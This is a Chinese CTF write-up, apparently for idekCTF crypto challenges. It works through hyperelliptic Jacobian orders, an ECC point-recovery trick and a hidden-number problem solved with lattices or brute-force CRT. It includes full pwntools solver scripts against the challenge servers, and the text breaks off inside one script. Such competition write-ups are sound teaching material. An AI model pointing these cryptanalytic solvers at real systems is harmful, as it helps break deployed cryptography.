SageMath 库提供了直接计算这个多项式的函数 `H.frobenius_polynomial()`。脚本中通过调用 `sum(H.frobenius_polynomial())`，实际上就是计算了 $\chi_C(t)$ 在 $t=1$ 处的值，从而得到了群的总阶 $N = |J(C)|$。

> 似乎别的函数还要再快一些，但快不了多少...

---

#### **第三步：计算点 $G$ 的真实阶**

服务器最后会给出一个挑战点 $G = (G_U, G_V)$，要求我们计算它的阶。根据**拉格朗日定理**，点 $G$ 的阶 $\text{ord}(G)$ 必须整除群的总阶 $N$。

为了找到 $G$ 的**真实阶**（即满足 $k \cdot G = \mathcal{O}$ 的最小正整数 $k$，其中 $\mathcal{O}$ 是单位元），我们采用以下算法：
1.  计算群阶 $N = |J(C)|$。
2.  对 $N$ 进行质因数分解：$N = p_1^{e_1} p_2^{e_2} \cdots p_k^{e_k}$。
3.  初始化一个候选阶 `order_candidate` 为 $N$。
4.  对每一个质因子 $p_i$，我们不断尝试用它去除 `order_candidate`。只要 $(\text{order\_candidate} / p_i) \cdot G$ 的结果是单位元（在Mumford表示中，单位元是 $(U=1, V=0)$），我们就更新 `order_candidate`：

    $$\text{order\_candidate} \leftarrow \frac{\text{order\_candidate}}{p_i}$$

    这个过程一直持续到除以 $p_i$ 后不再是单位元为止。
5.  遍历完所有质因子后，`order_candidate` 的最终值就是点 $G$ 的真实阶。

将这个阶发送给服务器，即可获得 flag。

```flag
idek{find_the_order_of_hyperelliptic_curve_is_soooo_hard:((}
```

懒得贴了，直接看 `Happy ECC - Revenge` 的 Exploit，没啥区别


## Diamond Ticket

### 题目

```python
from Crypto.Util.number import *

#Some magic from Willy Wonka
p = 170829625398370252501980763763988409583
a = 164164878498114882034745803752027154293
b = 125172356708896457197207880391835698381

def chocolate_generator(m:int) -> int:
    return (pow(a, m, p) + pow(b, m, p)) % p

#The diamond ticket is hiding inside chocolate
diamond_ticket = open("flag.txt", "rb").read()
assert len(diamond_ticket) == 26
assert diamond_ticket[:5] == b"idek{"
assert diamond_ticket[-1:] == b"}"
diamond_ticket = bytes_to_long(diamond_ticket[5:-1])

flag_chocolate = chocolate_generator(diamond_ticket)
chocolate_bag = []

#Willy Wonka are making chocolates
for i in range(1337):
    chocolate_bag.append(getRandomRange(1, p))

#And he put the golden ticket at the end
chocolate_bag.append(flag_chocolate)

#Augustus ate lots of chocolates, but he can't eat all cuz he is full now :D
remain = chocolate_bag[-5:]

#Compress all remain chocolates into one
remain_bytes = b"".join([c.to_bytes(p.bit_length()//8, "big") for c in remain])

#The last chocolate is too important, so Willy Wonka did magic again
P = getPrime(512)
Q = getPrime(512)
N = P * Q
e = bytes_to_long(b"idek{this_is_a_fake_flag_lolol}")
d = pow(e, -1, (P - 1) * (Q - 1))
c1 = pow(bytes_to_long(remain_bytes), e, N)
c2 = pow(bytes_to_long(remain_bytes), 2, N) # A small gift

#How can you get it ?
print(f"{N = }")
print(f"{c1 = }")
print(f"{c2 = }") 

"""
N = 85494791395295332945307239533692379607357839212287019473638934253301452108522067416218735796494842928689545564411909493378925446256067741352255455231566967041733698260315140928382934156213563527493360928094724419798812564716724034316384416100417243844799045176599197680353109658153148874265234750977838548867
c1 = 27062074196834458670191422120857456217979308440332928563784961101978948466368298802765973020349433121726736536899260504828388992133435359919764627760887966221328744451867771955587357887373143789000307996739905387064272569624412963289163997701702446706106089751532607059085577031825157942847678226256408018301
c2 = 30493926769307279620402715377825804330944677680927170388776891152831425786788516825687413453427866619728035923364764078434617853754697076732657422609080720944160407383110441379382589644898380399280520469116924641442283645426172683945640914810778133226061767682464112690072473051344933447823488551784450844649
"""
```

## Sadness ECC - Revenge

Revenge 换了更麻烦的 PoW, 糊一个解决 PoW 的代码段上去就行

后续的做法没啥区别

```python
# bad ecc revenge exp.py
# sage
from pwn import remote
import subprocess
import ast
from sage.all import *

# PoW
kctf_solver_code = """
#!/usr/bin/env python3
import base64, os, secrets, socket, sys, hashlib
try:
    import gmpy2
    HAVE_GMP = True
except ImportError:
    HAVE_GMP = False
VERSION = 's'
MODULUS = 2**1279-1
def python_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for i in range(diff):
        x = pow(x, exponent, p) ^ 1
    return x
def gmpy_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for i in range(diff):
        x = gmpy2.powmod(x, exponent, p).bit_flip(0)
    return int(x)
def sloth_root(x, diff, p):
    if HAVE_GMP: return gmpy_sloth_root(x, diff, p)
    else: return python_sloth_root(x, diff, p)
def encode_number(num):
    size = (num.bit_length() // 24) * 3 + 3
    return str(base64.b64encode(num.to_bytes(size, 'big')), 'utf-8')
def decode_number(enc):
    return int.from_bytes(base64.b64decode(bytes(enc, 'utf-8')), 'big')
def decode_challenge(enc):
    dec = enc.split('.')
    if dec[0] != VERSION: raise Exception('Unknown challenge version')
    return list(map(decode_number, dec[1:]))
def encode_challenge(arr):
    return '.'.join([VERSION] + list(map(encode_number, arr)))
def solve_challenge(chal):
    [diff, x] = decode_challenge(chal)
    y = sloth_root(x, diff, MODULUS)
    return encode_challenge([y])
def main():
    if len(sys.argv) != 3 or sys.argv[1] != 'solve': sys.exit(1)
    challenge = sys.argv[2]
    solution = solve_challenge(challenge)
    sys.stdout.write(solution)
if __name__ == "__main__":
    main()
"""

class DummyPoint:
    O = object()

    def __init__(self, x=None, y=None):
        if (x, y) == (None, None):
            self._infinity = True
        else:
            assert DummyPoint.isOnCurve(x, y), (x, y)
            self.x, self.y = x, y
            self._infinity = False

    @classmethod
    def infinity(cls):
        return cls()

    def is_infinity(self):
        return getattr(self, "_infinity", False)

    @staticmethod
    def isOnCurve(x, y):
        return "<REDACTED>"

    def __add__(self, other):
        if other.is_infinity():
            return self
        if self.is_infinity():
            return other

        # ——— Distinct‑points case ———
        if self.x != other.x or self.y != other.y:
            dy    = self.y - other.y
            dx    = self.x - other.x
            inv_dx = 1 / dx
            prod1 = dy * inv_dx
            s     = prod1

            inv_s = 1 / s
            s3    = inv_s ** 3

            tmp1 = s * self.x
            d    = self.y - tmp1

            d_minus    = d - 1337
            neg_three  = -3
            tmp2       = neg_three * d_minus
            tmp3       = tmp2 * inv_s
            sum_x      = self.x + other.x
            x_temp     = tmp3 + s3
            x_pre      = x_temp - sum_x
            x          = x_pre

            tmp4       = self.x - x
            tmp5       = s * tmp4
            y_pre      = self.y - tmp5
            y          = y_pre

            return DummyPoint(x, y)

        dy_term       = self.y - 1337
        dy2           = dy_term * dy_term
        three_dy2     = 3 * dy2
        inv_3dy2      = 1 / three_dy2
        two_x         = 2 * self.x
        prod2         = two_x * inv_3dy2
        s             = prod2

        inv_s         = 1 / s
        s3            = inv_s**3

        tmp6          = s * self.x
        d2            = self.y - tmp6

        d2_minus      = d2 - 1337
        tmp7          = -3 * d2_minus
        tmp8          = tmp7 * inv_s
        x_temp2       = tmp8 + s3
        x_pre2        = x_temp2 - two_x
        x2            = x_pre2

        tmp9          = self.x - x2
        tmp10         = s * tmp9
        y_pre2        = self.y - tmp10
        y2            = y_pre2

        return DummyPoint(x2, y2)

    def __rmul__(self, k):
        if not isinstance(k, int) or k < 0:
            raise ValueError("Choose another k")
        
        R = DummyPoint.infinity()
        addend = self
        while k:
            if k & 1:
                R = R + addend
            addend = addend + addend
            k >>= 1
        return R

    def __repr__(self):
        return f"DummyPoint({self.x}, {self.y})"

    def __eq__(self, other):
        return self.x == other.x and self.y == other.y
        
def compositeModulusGCD(a, b):
    if(b == 0):
        return a.monic()
    else:
        return compositeModulusGCD(b, a % b)
def verify(x, y):
    return (x**2 - (y - 1337)**3) % n == 0

# Write the solver code to a file
with open("kctf_solver.py", "w") as f:
    f.write(kctf_solver_code)
 
# ECC
 
def compositeModulusGCD(a, b):
    if(b == 0): return a.monic()
    else: return compositeModulusGCD(b, a % b)
 
 
# Establish connection
io = remote("sad-ecc-revenge.chal.idek.team", 1337)
 
# --- Handle PoW using the subprocess method ---
print("[*] Handling Proof-of-Work using subprocess...")
io.recvuntil(b") solve ")
challenge = io.recvline().strip().decode()
print(f"[*] Received PoW challenge: {challenge}")
 
# Run the external solver script
result = subprocess.run(
    ['python3', 'kctf_solver.py', 'solve', challenge],
    capture_output=True,
    text=True
)
solution = result.stdout.strip()
 
print(f"[*] Calculated PoW solution: {solution}")
io.sendlineafter(b"Solution? ", solution.encode())
io.recvuntil(b"Correct\n")
print("[+] PoW solved!")

# io.interactive()
io.sendafter(b"> ", b"2\n")

n = 18462925487718580334270042594143977219610425117899940337155124026128371741308753433204240210795227010717937541232846792104611962766611611163876559160422428966906186397821598025933872438955725823904587695009410689230415635161754603680035967278877313283697377952334244199935763429714549639256865992874516173501812823285781745993930473682283430062179323232132574582638414763651749680222672408397689569117233599147511410313171491361805303193358817974658401842269098694647226354547005971868845012340264871645065372049483020435661973539128701921925288361298815876347017295555593466546029673585316558973730767171452962355953
x1, y1, x2, y2 = var("x1 y1 x2 y2")
s1, s2, s3 = eval(io.recvline().decode().split(":")[1])
# print(f"{s1}")
# print(f"{s2}")
# print(f"{s3}")

f = -x1 - x2 + 3*(x1 - x2)*(x1*(y1 - y2)/(x1 - x2) - y1 + 1337)/(y1 - y2) + (x1 - x2)**3/(y1 - y2)**3 -(2*x1 + x2 - 3*(x1 - x2)*(x1*(y1 - y2)/(x1 - x2) - y1 + 1337)/(y1 - y2) - (x1 - x2)**3/(y1 - y2)**3)*(y1 - y2)/(x1 - x2) + y1
f = f - s3
f = f(y1 = s1 - x1, y2 = s2 - x2)
f = f.numerator()
E1 = x1**2 - (y1 - 1337)**3
E2 = x2**2 - (y2 - 1337)**3
E1 = E1(y1 = s1 - x1)
E2 = E2(y2 = s2 - x2)
f1 = f.resultant(E1, x1)
f2 = f.resultant(E2, x1)
PR = PolynomialRing(Zmod(n), name="x")
x = PR.gens()[0]
g1 = PR(str(f1).replace("x2", "x"))
g2 = PR(str(f2).replace("x2", "x"))
x2_ = -list(compositeModulusGCD(g1, g2))[0]
y2_ = s2 - x2_

PR = PolynomialRing(Zmod(n), name="x")
x = PR.gens()[0]
f1 = f.resultant(E1, x2)
f2 = f.resultant(E2, x2)
g1 = PR(str(f1).replace("x1", "x"))
g2 = PR(str(f2).replace("x1", "x"))
x1_ = -list(compositeModulusGCD(g1, g2))[0]
y1_ = s1 - x1_
P1 = DummyPoint(x1_, y1_)
P2 = DummyPoint(x2_, y2_)
P3 = P1 + P2
x3_, y3_ = P3.x, P3.y
points = [x1_, y1_, x2_, y2_, x3_, y3_]
io.sendafter("Your reveal: ", str(points).encode() + b"\n")
print(io.recvall(3).decode())
# idek{the_idea_came_from_a_Vietnamese_high_school_Mathematical_Olympiad_competition_xD_sorry_for_unintended_:sob:_75f492115a34ff4324212e09e24aa5bd}
```


## Happy ECC - Revenge

> 后面上了复仇，需要用不带复仇的 flag 解密附件，但做出这道题的哥们把脚本删了，就用他提到的函数自己写了个，挂后台不抱希望结果出了，难绷

![](img/happy_ecc.png)

复仇的题目依旧没什么区别，看来是按照预期解做的

diff 下发现是加了一点点判断，暂时懒得放截图了

```python
# chall.py                               
from sage.all import *
from Crypto.Util.number import *

# Edited a bit from https://github.com/aszepieniec/hyperelliptic/blob/master/hyperelliptic.sage
class HyperellipticCurveElement:
    def __init__( self, curve, U, V ):
        self.curve = curve
        self.U = U
        self.V = V

    @staticmethod
    def Cantor( curve, U1, V1, U2, V2 ):
        # 1.
        g, a, b = xgcd(U1, U2)   # a*U1 + b*U2 == g
        d, c, h3 = xgcd(g, V1+V2) # c*g + h3*(V1+V2) = d
        h2 = c*b
        h1 = c*a
        # h1 * U1 + h2 * U2 + h3 * (V1+V2) = d = gcd(U1, U2, V1-V2)

        # 2.
        V0 = (U1 * V2 * h1 + U2 * V1 * h2 + (V1*V2 + curve.f) * h3).quo_rem(d)[0]
        R = U1.parent()
        V0 = R(V0)

        # 3.
        U = (U1 * U2).quo_rem(d**2)[0]
        U = R(U)
        V = V0 % U

        while U.degree() > curve.genus:
            # 4.
            U_ = (curve.f - V**2).quo_rem(U)[0]
            U_ = R(U_)
            V_ = (-V).quo_rem(U_)[1]

            # 5.
            U, V = U_.monic(), V_
        # (6.)

        # 7.
        return U, V

    def parent( self ):
        return self.curve

    def __add__( self, other ):
        U, V = HyperellipticCurveElement.Cantor(self.curve, self.U, self.V, other.U, other.V)
        return HyperellipticCurveElement(self.curve, U, V)

    def inverse( self ):
        return HyperellipticCurveElement(self.curve, self.U, -self.V)

    def __rmul__(self, exp):
        R = self.U.parent()
        I = HyperellipticCurveElement(self.curve, R(1), R(0))

        if exp == 0:
            return HyperellipticCurveElement(self.curve, R(1), R(0))
        if exp == 1:
            return self

        acc = I
        Q = self
        while exp:
            if exp & 1:
                acc = acc + Q
            Q = Q + Q
            exp >>= 1
        return acc
    
    def __eq__( self, other ):
        if self.curve == other.curve and self.V == other.V and self.U == other.U:
            return True
        else:
            return False

class HyperellipticCurve_:
    def __init__( self, f ):
        self.R = f.parent()
        self.F = self.R.base_ring()
        self.x = self.R.gen()
        self.f = f
        self.genus = floor((f.degree()-1) / 2)
    
    def identity( self ):
        return HyperellipticCurveElement(self, self.R(1), self.R(0))
    
    def random_element( self ):
        roots = []
        while len(roots) != self.genus:
            xi = self.F.random_element()
            yi2 = self.f(xi)
            if not yi2.is_square():
                continue
            roots.append(xi)
            roots = list(set(roots))
        signs = [ZZ(Integers(2).random_element()) for r in roots]

        U = self.R(1)
        for r in roots:
            U = U * (self.x - r)

        V = self.R(0)
        for i in range(len(roots)):
            y = (-1)**(ZZ(Integers(2).random_element())) * sqrt(self.f(roots[i]))
            lagrange = self.R(1)
            for j in range(len(roots)):
                if j == i:
                    continue
                lagrange = lagrange * (self.x - roots[j])/(roots[i] - roots[j])
            V += y * lagrange

        return HyperellipticCurveElement(self, U, V)
 
p = getPrime(40)
R, x = PolynomialRing(GF(p), 'x').objgen()

f = R.random_element(5).monic()
H = HyperellipticCurve_(f)

print(f"{p = }")
if __name__ == "__main__":
    cnt = 0
    while True:
        print("1. Get random point\n2. Solve the challenge\n3. Exit")
        try:
            opt = int(input("> "))
        except:
            print("❓ Try again."); continue

        if opt == 1:
            if cnt < 3:
                G = H.random_element()
                k = getRandomRange(1, p)
                P = k * G
                print("Here is your point:")
                print(f"{P.U = }")
                print(f"{P.V = }")
                cnt += 1
            else:
                print("You have enough point!")
                continue

        elif opt == 2:
            G = H.random_element()
            print(f"{(G.U, G.V) = }")
            print("Give me the order !")
            odr = int(input(">"))
            if (odr * G).U == 1 and odr > 0:
                print("Congratz! " + open("flag.txt", "r").read())
            else:
                print("Wrong...")
            break

        else:
            print("Farewell.") 
            break
```

本题可能卡时间，单纯超椭圆上运算太慢，多试试运气

```python
# crypto/Happy ECC - Revenge
import hashlib
import re
from sage.all import *
from pwn import *
import subprocess
import ast

context.log_level = "debug"

# ===================================================================
# ## Part 1: Official PoW Solver Code
# ## This code will be written to a file named 'kctf_solver.py'.
# ===================================================================

kctf_solver_code = """
#!/usr/bin/env python3
import base64, os, secrets, socket, sys, hashlib
try:
    import gmpy2
    HAVE_GMP = True
except ImportError:
    HAVE_GMP = False
VERSION = 's'
MODULUS = 2**1279-1
def python_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for i in range(diff):
        x = pow(x, exponent, p) ^ 1
    return x
def gmpy_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for i in range(diff):
        x = gmpy2.powmod(x, exponent, p).bit_flip(0)
    return int(x)
def sloth_root(x, diff, p):
    if HAVE_GMP: return gmpy_sloth_root(x, diff, p)
    else: return python_sloth_root(x, diff, p)
def encode_number(num):
    size = (num.bit_length() // 24) * 3 + 3
    return str(base64.b64encode(num.to_bytes(size, 'big')), 'utf-8')
def decode_number(enc):
    return int.from_bytes(base64.b64decode(bytes(enc, 'utf-8')), 'big')
def decode_challenge(enc):
    dec = enc.split('.')
    if dec[0] != VERSION: raise Exception('Unknown challenge version')
    return list(map(decode_number, dec[1:]))
def encode_challenge(arr):
    return '.'.join([VERSION] + list(map(encode_number, arr)))
def solve_challenge(chal):
    [diff, x] = decode_challenge(chal)
    y = sloth_root(x, diff, MODULUS)
    return encode_challenge([y])
def main():
    if len(sys.argv) != 3 or sys.argv[1] != 'solve': sys.exit(1)
    challenge = sys.argv[2]
    solution = solve_challenge(challenge)
    sys.stdout.write(solution)
if __name__ == "__main__":
    main()
"""

# Write the solver code to a file to be called by the subprocess
with open("kctf_solver.py", "w") as f:
    f.write(kctf_solver_code)

def parse_poly_str(s, R):
    """Parses the server's polynomial string into a Sage polynomial object."""
    return R(s.replace('^', '**'))

def solve():
    # Connect to the challenge server
    # conn = remote('happy-ecc.chal.idek.team', 1337)
    conn = remote('happy-ecc-revenge.chal.idek.team', 1337)

    # --- Part 1: Solve Proof-of-Work ---
    try:
        log.info("Waiting for Proof-of-Work challenge...")
        # pow_line = conn.recvuntil(b"Input the decimal result of n", timeout=10)
        # match = re.search(rb"b'(.+)'\)\.hexdigest\(\) = (.+)", pow_line)
        # salt, target_hash = match.group(1), match.group(2).decode()
        
        # log.info(f"PoW Salt: {salt.decode()}, Target: {target_hash}")
        # log.info("Brute-forcing PoW solution 'n'...")
        
        # for n in range(2**28):
        #     if hashlib.md5(str(n).encode() + salt).hexdigest() == target_hash:
        #         log.success(f"PoW solution found: n = {n}")
        #         conn.sendlineafter(b': ', str(n).encode())
        #         break
        # else:
        #     log.failure("Could not solve PoW.")
        #     conn.close()
        #     return
        # print("[*] Handling Proof-of-Work using subprocess...")
        io = conn
        io.recvuntil(b") solve ")
        challenge = io.recvline().strip().decode()
        print(f"[*] Received PoW challenge: {challenge}")

        # Run the external solver script and capture its output
        result = subprocess.run(
            ['python3', 'kctf_solver.py', 'solve', challenge],
            capture_output=True,
            text=True,
            check=True
        )
        solution = result.stdout.strip()

        print(f"[*] Calculated PoW solution: {solution}")
        io.sendlineafter(b"Solution? ", solution.encode())
        io.recvuntil(b"Correct\n")
        print("[+] PoW solved!")
            
    except Exception as e:
        log.warning(f"No PoW found or PoW failed: {e}")
        pass

    # --- Part 2: Recover f(x) via CRT ---
    conn.recvuntil(b'p = ')
    p = int(conn.recvline().strip())
    log.info(f"Received prime p = {p}")

    F = GF(p)
    R, x = PolynomialRing(F, 'x').objgen()

    congruences = []
    log.info("Requesting 3 points to recover f(x)...")
    for i in range(3):
        conn.sendlineafter(b'> ', b'1')
        conn.recvuntil(b'P.U = ')
        U_str = conn.recvline().strip().decode()
        conn.recvuntil(b'P.V = ')
        V_str = conn.recvline().strip().decode()
        U, V = parse_poly_str(U_str, R), parse_poly_str(V_str, R)
        congruences.append((V**2, U))
        log.success(f"Got point {i+1}")

    remainders, moduli = zip(*congruences)
    f = CRT_list(list(remainders), list(moduli)).monic()
    log.success(f"Recovered polynomial f(x) = {f}")

    # --- Part 3: Find True Order of G and Solve ---
    H = HyperellipticCurve(f)
    
    # CORRECTED LINE: Use the Frobenius polynomial as you suggested.
    group_order = sum(H.frobenius_polynomial())
    
    log.info(f"Full Jacobian group order is: {group_order}")
    
    # We still need the Jacobian object to work with its elements.
    J = H.jacobian()
    
    conn.sendlineafter(b'> ', b'2')
    
    # Parse the point G from server output
    conn.recvuntil(b'(G.U, G.V) = (')
    line = conn.recvuntil(b')', drop=True).decode()
    gu_str, gv_str = line.split(', ')
    G_U, G_V = parse_poly_str(gu_str, R), parse_poly_str(gv_str, R)
    log.info(f"Received point G: U={G_U}, V={G_V}")

    # Create the point G as a Jacobian element in Sage
    G_sage = J([G_U, G_V])
    identity = J(0) # Identity element

    # Find the true order by factoring the group order
    order_candidate = group_order
    prime_factors = factor(order_candidate)
    log.info(f"Factoring group order: {prime_factors}")

    for p_factor, exponent in prime_factors:
        for _ in range(exponent):
            test_order = order_candidate // p_factor
            if (test_order * G_sage) == identity:
                order_candidate = test_order
                log.info(f"Order is divisible by {p_factor}. New candidate: {order_candidate}")
            else:
                break

    true_order = order_candidate
    log.success(f"Found true order of G: {true_order}")

    conn.recvuntil(b'Give me the order !')
    conn.sendlineafter(b'>', str(true_order).encode())

    log.success("Correct order sent! Receiving flag...")
    flag = conn.recvall()
    print(flag.decode())

if __name__ == "__main__":
    solve()
```

## FITM

也有人用格，但我不会格，于是爆！注意优化一下内存和 GoRoutine 数量即可，中间试过写jsonRPC，但 SageMath 环境下，暴露有些问题，于是还是古法 stdio....

> 但显然，格更有含量，这个方案插个队

### 方法 1

## 阶段一：收集候选余数

对每一次与服务器的交互（对应素数 $p_i$），服务器返回一个 16 次多项式

$$
f_i(x)=\sum_{j=0}^{16}c_{i,j}x^{j}\pmod{p_i},
$$

其中系数 $c_{i,j}$ 大约有 640 位。
秘密 $s$（同样约 640 位）被随机嵌入在 $x^5$–$x^{11}$ 中的某个系数 $c_{i,k_i}$（$k_i\in\{5,\dots,11\}$）上。

由于 **系数大小 $\sim 2^{640}$ 远大于模数 $\sim 2^{64}$**，我们可以利用这一定量差异。

### 1. 查询点值
选取 12 个点

$$
x=m,\quad m=1,\dots ,12,
$$

并得到对应的 12 条共享

$$
f_i(m)\equiv y_m\pmod{p_i}\qquad (m=1,\dots ,12). 
$$

### 2. 小系数插值
使用拉格朗日插值构造唯一的次数 $\le 11$ 多项式

$$
Q_i(x)\;,\qquad \deg Q_i\le 11,
$$

使得

$$
Q_i(m)\equiv y_m\pmod{p_i}\quad (m=1,\dots,12).
$$

其系数均在 $[0,p_i-1]$ 之内，故称为“小”多项式。

### 3. 构造格
设

$$
h(x)=f_i(x)-Q_i(x).
$$

由于

$$
h(m)=f_i(m)-Q_i(m)\equiv0\pmod{p_i}\quad(m=1,\dots,12),
$$

在模 $p_i$ 意义下

$$
M(x)=\prod_{m=1}^{12}(x-m)
$$

整除 $h(x)$。在整数环里

$$
h(x)=G(x)M(x),\qquad \deg G=4,
$$

于是 $h$ 的系数向量位于由

$$
M(x),\;xM(x),\;x^{2}M(x),\;x^{3}M(x),\;x^{4}M(x)
$$

张成的 5‑维格 $L_i$ 中。

### 4. 在格中寻找候选
记 $q$ 为 $Q_i(x)$ 的系数向量，$h_j=c_{i,j}-q_j$ 为大系数。
对每个可能的秘密位置 $k\in\{5,\dots,11\}$：

1. 目标向量 $t=-q$。
2. 在格 $L_i$ 中解最近向量问题 (CVP)，得到一个向量 $h$ 与真实系数相近。
3. 复原

$$
c_{i,j}=h_j+q_j,
\qquad 
s_{i,k}=c_{i,k}\bmod p_i .
$$

对每个素数 $p_i$（共 17 个），可得到 7（即 12‑点插值产生的 7 种）候选余数 $s_{i,k}$。

---

## 阶段二：格攻击求解最终秘密

我们已经得到 17 组候选余数 $\{s_{i,k}\}$（$i=1,\dots,17$，$k=5,\dots,11$）。
目标是从每组中选出恰好一个，利用 CRT 合成唯一的 640 位整数 $S$。

### 1. 变量模型

引入二进制选择变量

$$
b_{i,k}\in\{0,1\},\qquad \sum_{k=5}^{11}b_{i,k}=1\quad (i=1,\dots,17).
$$

则

$$
S\equiv\sum_{i=1}^{17}\sum_{k=5}^{11}b_{i,k}\, s_{i,k}\pmod{p_i}\quad (i=1,\dots,17).
$$

### 2. CRT 合并

令

$$
M=\prod_{i=1}^{17}p_i,
\qquad
C_i=\frac{M}{p_i}\bigl(\tfrac{M}{p_i}\bigr)^{-1}\bmod p_i,
$$

则

$$
S\equiv\sum_{i=1}^{17}\Bigl(\sum_{k=5}^{11}b_{i,k}s_{i,k}\Bigr)C_i\pmod{M}.
$$

设基准选取 $k=5$：

$$
b_{i,5}=1-\sum_{k=6}^{11}b_{i,k},
$$

代入并整理得到

$$
S=S_{0}+\sum_{i=1}^{17}\sum_{k=6}^{11}b_{i,k}\, d_{i,k} - K\,M,
\tag{1}
$$

其中

* $S_{0}$ 为全部取 $k=5$ 时的 CRT 结果；
* $d_{i,k}$ 为切换为 $k$ 相对于基准 $5$ 的差值；
* $K$ 为任意整数。

式 (1) 中共 102 个二进制变量 $b_{i,k}$（$i=1,\dots,17$，$k=6,\dots,11$）和一个整数变量 $K$。

### 3. 构造格

构造 $103\times103$ 的下三角矩阵

$$
B=
\begin{pmatrix}
2 &        &        &        &        & d_{1,6} \\
  & 2      &        &        &        & d_{1,7} \\
  &        & \ddots &        &        & \vdots\\
  &        &        & 2      &        & d_{17,11}\\
  &        &        &        & 1 & -M
\end{pmatrix},
$$

* 前 102 行对应变量 $b_{i,k}$（对角线为 2 用于惩罚非 0/1 解）；
* 第 103 行对应 $K$（系数 $-M$）。

在该格中搜索短向量（例如使用 LLL）即可得到满足 (1) 且使

$$
0\le S<2^{640}
$$

的解。短向量的前 102 维即为所求的 $\{b_{i,k}\}$，第 103 位为 $K$。

### 4. 恢复秘密

把得到的 $\{b_{i,k}\}$ 代入 (1) 计算

$$
S=S_{0}+\sum_{i,k}b_{i,k}\,d_{i,k} - K\,M,
$$

即可得到原始的 640 位整数 $S$。将其转为十六进制并提交给服务器的 **Verify** 接口即可完成验证。

---

### 方法 2

这道题目的名称 "FITM" 暗示了中间人攻击（Man-in-the-Middle），flag 也印证了这点，但我们队伍的实际解法是一种利用数论技巧和暴力搜索相结合的方法来解决一个隐藏数字问题 (Hidden Number Problem)。

#### **解题思路**

我们的目标是找到一个640位的秘密整数 $S$。我们可以与一个服务器进行交互，该服务器知道一个隐藏的多项式 $P(x) = \sum_{i=5}^{11} a_i x^i$，其中系数 $a_i$ 是整数。

---

#### **第一步：利用DFT恢复多项式系数模p**

我们可以向服务器发送一个素数 $p$ 和12个求值点，服务器会返回多项式 $P(x)$ 在这些点上的值（模 $p$）。为了高效地恢复系数 $a_i \pmod p$，我们可以利用**离散傅里叶变换 (DFT)**。

具体策略是：
1.  选择一个特殊的64位素数 $p$，使得 $p-1$ 是12的倍数。这保证了在有限域 $GF(p)$ 中存在一个12次本原单位根 $\omega$ (primitive 12th root of unity)。
2.  我们将12个点 $\{\omega^0, \omega^1, \dots, \omega^{11}\}$ 发送给服务器。
3.  服务器返回 $y_k = P(\omega^k) \pmod p$ for $k=0, \dots, 11$。
4.  这组 $(y_0, \dots, y_{11})$ 正是多项式系数序列 $(a_0, \dots, a_{11})$ 的离散傅里叶变换（注意 $a_0, \dots, a_4$ 均为0）。
5.  我们可以通过**逆离散傅里叶变换 (IDFT)** 公式来恢复系数 $a_m \pmod p$：
    $$a_m \equiv \frac{1}{12} \sum_{k=0}^{11} y_k \omega^{-mk} \pmod p$$

> 不是我们，是 @法里树，这种方法我真想不出来

通过这个方法，对于每一个我们选择的素数 $p_i$，我们都可以计算出该多项式的7个非零系数模 $p_i$ 的值，记为 $\{c_{i,5}, c_{i,6}, \dots, c_{i,11}\}$。

---

#### **第二步：构建关于秘密S的同余方程组**

这是解法的核心假设：对于我们选择的任意一个素数 $p_i$，秘密整数 $S$ 模 $p_i$ 的值，恰好等于我们恢复出的7个系数模 $p_i$ 的值之一。
$$S \equiv c_{i,j} \pmod{p_i}, \quad \text{for some unknown } j \in \{5, 6, \dots, 11\}$$
由于我们不知道对于每个 $p_i$， $S$ 到底对应哪一个系数，所以对于每个 $p_i$，我们都得到了一个关于 $S \pmod{p_i}$ 的候选值集合 $\{c_{i,5}, \dots, c_{i,11}\}$。

`solve5.sage` 脚本执行了11次这个过程，使用了11个不同的素数 $(p_1, \dots, p_{11})$，从而建立了一个庞大的、带有选择分支的同余方程系统：
$$\begin{cases} S \equiv c_1 \pmod{p_1}, & c_1 \in \{c_{1,5}, \dots, c_{1,11}\} \\ S \equiv c_2 \pmod{p_2}, & c_2 \in \{c_{2,5}, \dots, c_{2,11}\} \\ \vdots \\ S \equiv c_{11} \pmod{p_{11}}, & c_{11} \in \{c_{11,5}, \dots, c_{11,11}\} \end{cases}$$

---

#### **第三步：暴力搜索与中国剩余定理求解**

上述系统中的路径总数是 $7^{11} \approx 1.9 \times 10^9$，这是一个非常巨大的搜索空间。

1.  **暴力搜索**: `solver4_final.go` 程序实现了一个并行的**深度优先搜索 (DFS)** 来遍历这个巨大的搜索树。树的每一层对应一个素数 $p_i$，有7个分支，每个分支对应一个候选的系数值 $c_{i,j}$。
2.  **中国剩余定理 (CRT)**: 对于搜索树中的每一条完整路径（即为每个 $p_i$ 选择一个 $c_i$），我们都得到一个确定的同余方程组。Go 程序利用 CRT 解出这个方程组，得到一个唯一的 $S$ 的候选值（模 $\prod p_i$）。
3.  **验证**: 程序会验证解出的 $S$ 是否为一个正的、小于 $2^{640}$ 的整数。第一个满足条件的 $S$ 就被认为是正确的秘密。

由于计算量巨大，使用编译型语言 Go 并利用多核 CPU 进行并行计算是成功破解此题的关键。Sage 脚本负责与服务器交互和进行数论预计算，而 Go 程序则作为后台的计算引擎，负责解决组合爆炸问题。

```bash
go build -o solver4_final solver4_final.go || chmod +x ./solve5.sage || ./solve5.sage
```

```python
#!/usr/bin/env sage
# Filename: solve5.sage

# Precise imports
from pwnlib.tubes.remote import remote
from Crypto.Util.number import getPrime, isPrime
import sys
import subprocess

# --- Configuration ---
HOST = "fitm.chal.idek.team"
PORT = 1337
N_INTERACTIONS = 11
GO_SOLVER_PATH = "./solver4_final"

def get_candidates_and_feed_solver(io, go_stdin):
    """
    Performs one interaction with the server to get shares, calculates
    candidates using FFT/DFT, and writes the result to the Go solver's stdin.
    """
    # 1. Find a special 64-bit prime p where p-1 is divisible by 12
    while True:
        k = getPrime(60)
        p = 12 * k + 1
        if p.bit_length() == 64 and isPrime(p):
            break

    print(f"[*] Using special prime p = {p}", file=sys.stderr)

    # 2. In GF(p), find a primitive 12th root of unity (w)
    F = GF(p)
    PR.<x> = PolynomialRing(F)
    f = x^12 - 1
    roots = f.roots(multiplicities=False)
    assert len(roots) == 12, "Failed to find 12 roots of unity."

    w = None
    # *** FIX: Iterate directly over the roots, not tuples ***
    for r in roots:
        if r.multiplicative_order() == 12:
            w = r
            break
    assert w is not None, "Failed to find a primitive 12th root of unity."

